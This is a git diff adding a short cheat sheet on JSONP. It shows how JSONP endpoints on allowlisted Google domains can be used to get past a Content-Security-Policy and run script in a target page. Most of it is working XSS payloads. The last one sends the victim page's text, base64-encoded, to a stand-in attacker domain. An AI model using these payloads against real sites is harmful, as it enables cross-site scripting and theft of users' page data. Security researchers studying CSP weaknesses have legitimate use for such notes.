@@ -1,0 +1,24 @@
+
+JSONP (JSON with Padding)
+
+JSONP is a method for sending JSON data without worrying about cross-domain issues (Cross-Origin Resource Sharing CORS).
+
+JSONP does not use the XMLHttpRequest object or Fetch API (cuz they follow the same-origin policy).
+
+JSONP uses the <script> tag instead bypassing same-origin policy.
+
+<script src="/path/jsonp?callback=alert(document.domain)//"></script>
+
+Content-Security-Policy:
+	default-src 'self' https://*.google.com https://*.googleapis.com https://*.twitter.com; 
+
+Bypass Steps:
+	<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
+	<script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+
+Before sending your payload you have to know that the script will run before the page complete loaded so you need to add {defer} or {async} attribute to the script tag : <script  src="" defer="true" async>
+The {defer } attribute tells the browser not to wait for the script. Instead, the browser will continue to process the HTML, build DOM. The script loads “in the background”, and then runs when the DOM is fully built.
+The {async } attribute is somewhat like defer. It also makes the script non-blocking. But it has important differences in the behavior.
+
+Payload will look like this:
+<script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(location.href='http://your-domain.com/index.php?c='.concat(btoa(document.body.innerText)))" defer></script>
